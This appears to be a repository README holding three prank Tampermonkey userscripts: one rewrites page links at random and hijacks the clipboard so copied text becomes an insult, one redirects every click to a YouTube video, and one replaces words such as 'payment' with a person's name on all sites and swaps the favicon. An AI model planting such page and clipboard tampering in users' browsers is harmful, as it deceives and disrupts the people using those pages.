# temper-monkey

##1
```
(function () {
    'use strict';
    const okooraLink = 'https://stage.okoora.com/';
    const stepper = {step: 0}
    const copiedWords = ['var idiot = "you"'];
    const hoverdLinks = [
        'https://www.quora.com/What-is-the-most-absurd-code-youve-ever-seen',
        'https://www.quora.com/What-is-the-most-absurd-code-youve-ever-seen/answer/Khaled-Bakhit-2',
'https://www.w3schools.com/js/js_variables.asp',
        'https://stackoverflow.com/questions/3892696/is-var-necessary-when-declaring-javascript-variables',
        'https://stackoverflow.com/questions/4539253/what-is-console-log',
        'https://books.google.co.il/books?id=Y-UJEAAAQBAJ&pg=PA258&lpg=PA258&dq=how+to+console+log+stackoverflow&source=bl&ots=_vUYCXdF6f&sig=ACfU3U1oGfYXHFHnX-WtflFq9r34egNobQ&hl=iw&sa=X&ved=2ahUKEwi9tN7suNf5AhVDnVwKHfcsCboQ6AF6BAglEAM',
    ];
    window.onload = function (e) {
        document.addEventListener('mouseover', function (e) {
            console.log ("You are in ", e.target?.href,hoverdLinks);
            if(e.target?.href && !hoverdLinks.includes(e.target?.href)) {
                hoverdLinks.push(e.target?.href)
            }
            document.querySelectorAll('a').forEach((a, i) => {
                const randomedLink = hoverdLinks[Math.floor(Math.random()*hoverdLinks.length)];
                if(randomedLink) {
                    a.href = hoverdLinks[Math.floor(Math.random()*hoverdLinks.length)];
                }
            });
        });
        document.addEventListener('copy', function(e){
            const randomItem = copiedWords[Math.floor(Math.random()*copiedWords.length)];
            const selectionText = window.getSelection().toString();
            const text = window.getSelection().toString().replace(/.+/g, copiedWords[stepper.step]);
            e.clipboardData.setData('text/plain', text);
            stepper.step++;
            copiedWords[stepper.step] = selectionText;
            e.preventDefault();
        });
    };
})();
```

## 2
```
(function () {
    'use strict';
    window.onload = function(e) {
        //the event occurred
        document.querySelectorAll('*').forEach(e => {
            e.addEventListener('click', () => {
                window.location.href = 'https://www.youtube.com/watch?v=BkD2nN5275c&ab_channel=FunnyAnimals%27Life';
            });
        });
    };
})();
```
## 3
```
// ==UserScript==
// @name         New Userscript
// @namespace    http://tampermonkey.net/
// @version      0.1
// @description  try to take over the world!
// @author       You
// @match      *://*/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=tampermonkey.net
// @grant        none
// ==/UserScript==

(function () {
    'use strict';
    window.onload = function (e) {
        document.querySelectorAll('p,span,a,h1,h2,h3,h4,h5,h6').forEach(e => {
            const rgx = new RegExp(/\s the|text|test|home|hedging|payment|pay/g)
            if(e?.textContent.match(rgx)) {
                console.log(e.textContent)
                e.textContent = e.textContent.replace(rgx, ' Eli Ben Dayan 😎 ')
            }
        });

        var link = document.querySelector("link[rel~='icon']");
        if (!link) {
            link = document.createElement('link');
            link.rel = 'icon';
            document.getElementsByTagName('head')[0].appendChild(link);
        }
        link.href = 'https://avatar-management--avatars.us-west-2.prod.public.atl-paas.net/5e245a50a7b9540e76f40540/4bbf50a7-ae7f-4338-a30e-942227d3dfd8/48';
    };
})();
```
